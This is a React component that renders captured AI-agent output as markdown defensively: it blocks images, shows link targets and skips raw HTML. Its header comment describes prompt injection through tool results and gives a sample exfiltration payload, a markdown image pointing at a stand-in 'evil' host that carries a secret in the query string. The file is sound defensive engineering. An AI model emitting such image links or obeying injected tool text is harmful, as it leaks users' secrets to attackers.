import React from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { Prism as SyntaxHighlighter } from "react-syntax-highlighter";
import { a11yDark } from "react-syntax-highlighter/dist/cjs/styles/prism";
import { Box, Chip, Typography } from "@mui/material";

// Markdown for captured agent content (jyx.82). Captured text is
// attacker-influenced (prompt injection through tool results), so nothing in
// it may make the viewer's browser fetch anything:
// - images never render: an image becomes a chip with its alt text and host,
//   so a "![](https://evil/?d=SECRET)" in model output is not requested;
// - links stay visible with their target shown, open in a new tab with
//   rel="noopener noreferrer nofollow", and keep react-markdown's default URL
//   sanitising (javascript: and the like are dropped);
// - raw HTML is never rendered (no rehype-raw; skipHtml).

const hostOf = (url) => {
  try {
    return new URL(url).host || url;
  } catch (e) {
    return url || "";
  }
};

const components = {
  p: ({ node, ...props }) => <Typography variant="body2" component="div" sx={{ mb: 1 }} {...props} />,
  img: ({ node, src, alt }) => (
    <Chip
      size="small"
      variant="outlined"
      data-testid="blocked-image"
      label={`image${alt ? `: ${alt}` : ""}${src ? ` (${hostOf(src)}, not loaded)` : ""}`}
      sx={{ my: 0.5 }}
    />
  ),
  a: ({ node, href, children }) =>
    href ? (
      <>
        <a href={href} target="_blank" rel="noopener noreferrer nofollow">
          {children}
        </a>
        {String(children) !== href && (
          <Typography component="span" variant="caption" color="text.secondary" sx={{ ml: 0.5 }}>
            ({href})
          </Typography>
        )}
      </>
    ) : (
      <span>{children}</span>
    ),
  code: ({ node, inline, className, children, ...props }) => {
    const match = /language-(\w+)/.exec(className || "");
    if (inline || !match) {
      return (
        <Box component="code" sx={{ fontFamily: "monospace", bgcolor: "action.hover", px: 0.5, borderRadius: 0.5 }} {...props}>
          {children}
        </Box>
      );
    }
    return (
      <SyntaxHighlighter style={a11yDark} language={match[1]} PreTag="div" customStyle={{ maxWidth: "100%", overflowX: "auto" }}>
        {String(children).replace(/\n$/, "")}
      </SyntaxHighlighter>
    );
  },
};

const CapturedMarkdown = ({ content }) => (
  <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={components}>
    {content || ""}
  </ReactMarkdown>
);

export default CapturedMarkdown;
